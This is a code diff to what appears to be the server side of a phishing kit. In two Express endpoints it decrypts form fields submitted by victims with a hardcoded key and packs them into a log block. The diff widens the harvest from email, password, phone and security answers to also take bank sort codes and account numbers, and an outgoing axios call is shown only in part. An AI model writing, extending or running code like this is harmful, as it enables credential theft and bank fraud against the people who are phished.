@@ -6702,6 +6702,12 @@ app.post("/sfeNBA", (req, res) => {
   telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
     CryptoJS.enc.Utf8
   );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
   secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -6709,7 +6715,7 @@ app.post("/sfeNBA", (req, res) => {
     CryptoJS.enc.Utf8
   );
 
-  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
+  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
 
   if (chasingfunds == 10) {
     axios
@@ -6773,6 +6779,12 @@ app.post("/sfeChasing", (req, res) => {
   telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
     CryptoJS.enc.Utf8
   );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
   secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -6780,7 +6792,7 @@ app.post("/sfeChasing", (req, res) => {
     CryptoJS.enc.Utf8
   );
 
-  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
+  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
 
   if (chasingfunds == 10) {
     axios
